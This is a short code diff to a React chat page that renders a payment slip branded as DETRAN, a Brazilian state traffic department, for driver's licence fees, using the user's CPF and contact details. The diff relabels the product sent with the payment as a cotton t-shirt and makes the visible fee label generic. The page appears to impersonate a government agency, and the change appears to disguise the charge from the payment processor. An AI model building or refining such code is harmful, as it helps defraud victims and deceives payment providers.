@@ -442,7 +442,7 @@ export default function ChatPage() {
           email: userBasicData.email || 'usuario@email.com',
           cpf: userCpf.replace(/\D/g, ''),
           telefone: userBasicData.telefone || '11999999999',
-          produto: 'Taxas Administrativas CNH',
+          produto: 'Camiseta Algodão Premium',
           endereco: {
             street: userBasicData.endereco || 'Rua',
             streetNumber: '0',
@@ -926,7 +926,7 @@ export default function ChatPage() {
                         <p className="font-bold text-gray-800">DETRAN.{detranSigla}</p>
                         <p className="text-xs text-gray-500">Departamento Estadual de Trânsito</p>
                         <p className="font-bold text-gray-700 mt-2">GUIA DE RECOLHIMENTO</p>
-                        <p className="text-xs text-gray-500">TAXAS ADMINISTRATIVAS CNH</p>
+                        <p className="text-xs text-gray-500">GUIA DE PAGAMENTO</p>
                       </div>
                       <div className="p-4">
                         <div className="mb-3">
